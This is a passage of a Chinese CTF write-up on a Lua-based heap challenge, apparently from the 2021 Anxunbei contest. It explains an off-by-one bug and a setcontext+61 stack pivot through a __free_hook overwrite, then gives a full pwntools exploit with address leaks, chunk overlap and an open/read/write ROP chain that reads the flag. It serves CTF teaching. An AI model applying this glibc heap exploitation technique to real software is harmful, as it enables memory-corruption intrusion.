              v3 += v5;
          }
          dword_5AA0[i] = size;
          encode(&key, qword_5780[i], v3);                     
          lua_pushinteger(a1, i);
          printf("gift: %llx\n", qword_5780[i] & 0xFFFLL);     
          if ( !*(_BYTE *)qword_5780[i] )                        
            read(0, (void *)(qword_5780[i] + j), 1uLL);
          result = 1LL;
        }
        else
        {
          result = 0LL;
        }
      }
      else
      {
        error(
          a1,
          (int)"In function: add_data, first argument must a number",
          "In function: add_data, first argument must a number");
        result = 0LL;
      }
      return result;
    }
到这里基本清楚程序存在offbyone漏洞，沙箱限制getshell，onegadgetsystem(‘/bin/sh’)不好用了，只能读取flag，可以构造orw读取flag，可通过制造堆块重叠来打__free_hook,
修改freehook为setcontext+61的思路去刷新环境，进行堆栈迁移，构造orw，读取flag。  
这里setcontext+61关键的寄存器是rdx，setcontext+61片段如下：
    .text:00000000000580DD                 mov     rsp, [rdx+0A0h]  刷新rsp到heap,指向orw ROP链
    .text:00000000000580E4                 mov     rbx, [rdx+80h]
    .text:00000000000580EB                 mov     rbp, [rdx+78h]
    .text:00000000000580EF                 mov     r12, [rdx+48h]
    .text:00000000000580F3                 mov     r13, [rdx+50h]
    .text:00000000000580F7                 mov     r14, [rdx+58h]
    .text:00000000000580FB                 mov     r15, [rdx+60h]
    .text:00000000000580FF                 test    dword ptr fs:48h, 2
    .text:000000000005810B                 jz      loc_581C6
    .text:00000000000581C6 loc_581C6:                              ; CODE XREF: setcontext+6B↑j
    .text:00000000000581C6                 mov     rcx, [rdx+0A8h] 
    .text:00000000000581CD                 push    rcx
    .text:00000000000581CE                 mov     rsi, [rdx+70h]
    .text:00000000000581D2                 mov     rdi, [rdx+68h]
    .text:00000000000581D6                 mov     rcx, [rdx+98h]
    .text:00000000000581DD                 mov     r8, [rdx+28h]
    .text:00000000000581E1                 mov     r9, [rdx+30h]
    .text:00000000000581E5                 mov     rdx, [rdx+88h]
    .text:00000000000581E5 ; } // starts at 580A0
    .text:00000000000581EC ; __unwind {
    .text:00000000000581EC                 xor     eax, eax
    .text:00000000000581EE                 retn                  ret ->orw ROP >
在此之前需要将heap地址赋值给rdx，然后才能将栈迁移到堆上，我们知道free的时候第一个参数rdi是当前chunk的地址，那么只要将rdi的值赋值给rdx之后再返回到setcontext+61就行了，怎么找gadget能实现如上功能呢？我们在libc的function
getkeyserv_handle里能找到如下gadget：
    .text:0000000000154930                 mov     rdx, [rdi+8]
    .text:0000000000154934                 mov     [rsp+0C8h+var_C8], rax
    .text:0000000000154938                 call    qword ptr [rdx+20h]
所以在当前chunk+8的地方放当前heap地址可以实现给rdx赋值，然后在rdx+0x20处放setcontext地址就会返回到setcontext，在rdx+0xa0处放置orw
Rop的开始地址，并将rsp指针刷新到指定heap上，执行到ret的时候将rcx移出栈顶，紧接着ret后返回orw的rop开始处，此时rsp和堆栈同时指向orw
ROP开始处，开始在heap上构造orw读取flag。  
构造赋值想让的步骤如下：
  1. 通过largebinattack泄露libc，获得freehook、setcontext、rop链地址
  2. 在制造chunk overlap之前应该将0x30大小的堆填满，释放，之后在新申请的chunk之间就不会有0x30大小的chunk相隔，才能制造overlap。原因猜测是为之后的申请腾空间，所以后面申请的就不会隔开了，具体原因待查
  3. 泄露heap地址，制造chunk overlap
  4. 写入freehook地址，修改freehook为gadget（set rdx && call setcontext）
  5. 申请一个chunk，构造rop修改rdx，返回setcontext，刷新堆栈，之后orw
  6. free触发rop链，orw读取flag
###  exp
    from pwn import *
    from gmssl import func
    context.log_level = 'debug'
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    #io = remote('127.0.0.1', 6010)
    # libc = ELF('./libc-2.31.so')
    # io = process(['./test', 'real'])
    io = process('./pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
    l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
    rl = lambda    a=False        : io.recvline(a)
    ru = lambda a,b=True    : io.recvuntil(a,b)
    rn = lambda x            : io.recvn(x)
    sn = lambda x            : io.send(x)
    sl = lambda x            : io.sendline(x)
    sa = lambda a,b            : io.sendafter(a,b)
    sla = lambda a,b        : io.sendlineafter(a,b)
    irt = lambda            : io.interactive()
    dbg = lambda text=None  : gdb.attach(io, text)
    lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
    uu32 = lambda data        : u32(data.ljust(4, b'\x00'))
    uu64 = lambda data        : u64(data.ljust(8, b'\x00'))
    ur64 = lambda data        : u64(data.rjust(8, b'\x00'))
    initkey = p64(0x6b8b4567327b23c6)
    table = [
      0xBE, 0xD1, 0x90, 0x88, 0x57, 0x00, 0xE9, 0x53, 0x10, 0xBD, 
      0x2A, 0x34, 0x51, 0x84, 0x07, 0xC4, 0x33, 0xC5, 0x3B, 0x53, 
      0x5F, 0xA8, 0x5D, 0x4B, 0x6D, 0x22, 0x63, 0x5D, 0x3C, 0xBD, 
      0x47, 0x6D, 0x22, 0x3F, 0x38, 0x4B, 0x7A, 0x4C, 0xB8, 0xCC, 
      0xB8, 0x37, 0x78, 0x17, 0x73, 0x23, 0x27, 0x71, 0xB1, 0xC7, 
      0xA6, 0xD1, 0xA0, 0x48, 0x21, 0xC4, 0x1B, 0x0A, 0xAD, 0xC9, 
      0xA5, 0xE6, 0x14, 0x18, 0xFC, 0x7B, 0x53, 0x59, 0x8B, 0x0D, 
      0x07, 0xCD, 0x07, 0xCC, 0xBC, 0xA5, 0xE0, 0x28, 0x0E, 0xF9, 
      0x31, 0xC8, 0xED, 0x78, 0xF4, 0x75, 0x60, 0x65, 0x52, 0xB4, 
      0xFB, 0xBF, 0xAC, 0x6E, 0xEA, 0x5D, 0xCA, 0x0D, 0xB5, 0x66, 
      0xAC, 0xBA, 0x06, 0x30, 0x95, 0xF4, 0x96, 0x42, 0x7A, 0x7F, 
      0x58, 0x6D, 0x83, 0x8E, 0xF6, 0x61, 0x7C, 0x0E, 0xFD, 0x09, 
      0x6E, 0x42, 0x6B, 0x1E, 0xB9, 0x14, 0x22, 0xF6, 0x16, 0xD2, 
      0xD2, 0x60, 0x29, 0x23, 0x32, 0x9E, 0xB4, 0x82, 0xEE, 0x58, 
      0x3A, 0x7D, 0x1F, 0x74, 0x98, 0x5D, 0x17, 0x64, 0xE4, 0x6F, 
      0xF5, 0xAD, 0x94, 0xAA, 0x89, 0xE3, 0xBE, 0x98, 0x91, 0x38, 
      0x70, 0xEC, 0x2F, 0x5E, 0x9F, 0xC9, 0xB1, 0x26, 0x3A, 0x64, 
      0x48, 0x13, 0xF1, 0x1A, 0xC5, 0xD5, 0xE5, 0x66, 0x11, 0x11, 
      0x3A, 0xAA, 0x79, 0x45, 0x42, 0xB4, 0x57, 0x9D, 0x3F, 0xBC, 
      0xA3, 0xAA, 0x98, 0x4E, 0x6B, 0x7A, 0x4A, 0x2F, 0x3E, 0x10, 
      0x7A, 0xC5, 0x33, 0x8D, 0xAC, 0x0B, 0x79, 0x33, 0x5D, 0x09, 
      0xFC, 0x9D, 0x9B, 0xE5, 0x18, 0xCD, 0x1C, 0x7C, 0x8B, 0x0A, 
      0xA8, 0x95, 0x56, 0xCC, 0x4E, 0x34, 0x31, 0x33, 0xF5, 0xC1, 
      0xF5, 0x03, 0x0A, 0x4A, 0xB4, 0xD1, 0x90, 0xF1, 0x8F, 0x57, 
      0x20, 0x05, 0x0D, 0xA0, 0xCD, 0x82, 0xB3, 0x25, 0xD8, 0xD2, 
      0x20, 0xF3, 0xC5, 0x96, 0x35, 0x35
    ]
    def encode(key,passwd):
        key = func.bytes_to_list(key)
        passwd = func.bytes_to_list(passwd)
        key_arr = [] 
        raw_key = [] 
        data_arr = [] 
        for c in key: 
            key_arr.append(c) 
            raw_key.append(c) 
        for c in passwd: 
            data_arr.append(c) 
        key = key_arr 
        passwd = data_arr    
        for i in range(len(passwd)):    
            v5 = (key[(i + 2) & 7] * (key[(i & 7)] + key[(i + 1) & 7]) + key[(i + 3) & 7])&0xff
            passwd[i] ^= v5 ^ table[v5]
            key[(i & 7)] = (2 * v5 + 3)&0xff
            if (i & 0xf) == 0:
                key = sub_143A(raw_key,table[i&0xff])
        out = b''
        for i in passwd:
            out += i.to_bytes(1, byteorder='little')
        return out      
    def sub_143A(key,seed):
        tmpkey = [0]*8
        for  i in range(8):
            tmpkey[i] = (key[i] ^ table[key[i]])&0xff
            tmpkey[i] ^= (seed + i)&0xff 
        return tmpkey
    passwdd = p32(0x00000000)
    password = encode(initkey,passwdd)
    print(hex(int.from_bytes(password,byteorder='little',signed=False))) #0x18f7d121 418894113
    def login():
        print(111)
        sla('$','login')
        sla('account:','1000')
        sla('password:','418894113')
    def add(size,content):
        sla('$','add')
        sla('?',str(size))
        sn(content)
    def delete(idx):
        sla('$','del')
        sla('?',str(idx))
    def get(idx):
        sla('$','get')
        sla('?',str(idx))
    login()
    # leak libc  larginbin attack
    add(0x500,'\n') #0
    add(0x500,'\n') #1
    delete(0) 
    add(0x500,'\n') #0
    get(0)
    ru('\n')
    libc_base = uu64(rn(6)) - 0x1c6b0a - 0x25000
    lg('libc_base')
    free_hook = libc_base + libc.sym['__free_hook'] 
    lg('free_hook')
    setcontext = libc_base + libc.sym['setcontext'] + 61 
    lg('setcontext')
    ret = libc_base + 0x25679 
    libc_open = libc_base + libc.sym['open'] 
    libc_read = libc_base + libc.sym['read'] 
    libc_write = libc_base + libc.sym['write'] 
    pop_rdi = libc_base + 0x26b72 
    pop_rsi = libc_base + 0x27529 
    pop_rdx_r12 = libc_base + 0x000000000011c371 # pop rdx ; pop r12 ; ret 
    gadget = libc_base + 0x154930 # local getkeyserv_handle  set rdx && call context
    '''
    .text:0000000000154930                 mov     rdx, [rdi+8]
    .text:0000000000154934                 mov     [rsp+0C8h+var_C8], rax
    .text:0000000000154938                 call    qword ptr [rdx+20h]
    '''
    # fill size=0x30 chunk
    add(0x80, '\n') # 2 
    add(0x20, '\n') # 3 
    b = 3 
    j = 20 
    for i in range(b, j): 
        add(0x20, 'AAA\n') 
    for i in range(b + 10, j): 
        delete(i) 
    # make overlap chunk
    add(0x98, encode(initkey, b'AAA') + b'\n') # 13 
    add(0x500, encode(initkey, b'AAA') + b'\n') # 14 
    dbg()
    add(0xa0, 'AAA\n') # 15 
    add(0xa0, 'AAA\n') # 16 
    add(0xa0, 'AAA\n') # 17 
    delete(13) 
    delete(17) 
    delete(16) 
    delete(15) 
    # leak heap addr 
    add(0xa8, b'\n') # 13 
    get(13) 
    io.recvuntil('\n')
    heap = u64(io.recv(6).ljust(8, b'\x00')) - 0xa + 0x50+0xb0*2 +0x10# local  chunk17's heapaddr
    #heap = u64(io.recv(6).ljust(8, b'\x00')) - 0xa + 0x200 # local 
    lg('heap')
    delete(13)
    p = b'\x00' + b'\x11' * 0x97 
    #dbg()
    add(0x98, encode(initkey, p) + b'\xc1') # 13 
    # overlap
    delete(14) 
    # 5c0 
    p = b'A' * 0x500 
    p += p64(0) + p64(0xb1) 
    p += p64(libc_base + libc.sym['__free_hook']) + p64(0) 
    add(0x5b0, encode(initkey, p) + b'\n') # 14 
    # remalloc freehook 
    add(0xa8, encode(initkey, b"/bin/sh\x00") + b'\n') # 13 
    add(0xa8, encode(initkey, p64(gadget)) + b'\n') # modify __free_hook as a gadget set rdi -> rdx 
    p = p64(1) + p64(heap) # set to rdx
    p += p64(setcontext) *4 # call setcontext
    p = p.ljust(0xa0, b'\x11') 
    p += p64(heap + 0xb0) # rsp 
    p += p64(ret) # rcx 
    rop = p64(pop_rdi) + p64(heap + 0xb0 + 0x98 + 0x18) 
    rop += p64(pop_rsi) + p64(0) 
    rop += p64(pop_rdx_r12) + p64(0) + p64(0) 
    rop += p64(libc_open) 
    rop += p64(pop_rdi) + p64(3) 
    rop += p64(pop_rsi) + p64(heap) 
    rop += p64(pop_rdx_r12) + p64(0x80) + p64(0) 
    rop += p64(libc_read) 
    rop += p64(pop_rdi) + p64(1) 
    rop += p64(libc_write) 
    rop += p64(pop_rdi) + p64(0) 
    rop += p64(libc_read) 
    p += rop 
    p += b'./flag\x00' 
    add(0x800, encode(initkey, p) + b'\n') # 17 
    print('get flag...') 
    # triggger free
    delete(17)
    #dbg()
    irt()
###  总结
这次比赛算这道题目是压轴题，做出来的人数个位数，题目参杂了很多知识，包括lua语言、c和lua互调规则、沙箱禁用59号中断、ORW、花指令、简单异或流加密、offbyone、lua程序在互调过程中申请chunk的处理，想要做出来不容易，之后复盘也是复盘了好久才看明白，之前不知道freehook修改成setcontext的利用方式，这次明白了，利用setcontext+61，刷新栈到指定堆上，然后构造orw。
进一步增加难度，修改lua虚拟机opcode，使得通用反编译失败，需要逆向opcode顺序，重新编译反编译工具，这就更变态了。
## 附件
[附件](https://github.com/1094093288/IMG/tree/master/Pwn/2021anxunbei)